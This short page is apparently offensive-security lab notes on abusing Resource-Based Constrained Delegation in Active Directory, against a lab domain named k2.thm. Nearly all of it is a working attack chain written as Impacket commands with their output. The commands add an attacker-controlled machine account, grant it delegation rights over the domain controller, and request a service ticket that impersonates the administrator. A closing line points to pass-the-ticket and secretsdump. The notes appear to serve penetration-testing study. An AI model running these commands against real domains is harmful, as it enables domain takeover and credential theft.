# Resource-Based Constrained Delegation

{% embed url="https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5" %}



First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:

{% code title="" overflow="wrap" %}
```bash
impacket-addcomputer -method SAMR -computer-name 'GIGIPC' -computer-pass 'Password123!' -dc-host 'K2RootDC.k2.thm' -domain-netbios k2.thm 'k2.thm/o.armstrong:arMStronG08'

# output
[*] Successfully added machine account GIGIPC$ with password Password123!.
```
{% endcode %}

We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:

{% code title="" overflow="wrap" %}
```bash
impacket-rbcd -delegate-from 'GIGIPC$' -delegate-to 'K2RootDC$' -action 'write' 'k2.thm/o.armstrong:arMStronG08'

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] GIGIPC$ can now impersonate users on K2RootDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     GIGIPC$      (S-1-5-21-1966530601-3185510712-10604624-1116)
```
{% endcode %}

And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.

{% code title="" overflow="wrap" %}
```bash
impacket-getST -spn 'cifs/K2RootDC.k2.thm' -impersonate 'administrator' 'k2.thm/GIGIPC$:Password123!'                                             

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_K2RootDC.k2.thm@K2.THM.ccache
```
{% endcode %}

This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.



Then

Pass-the-ticket and secretsdump
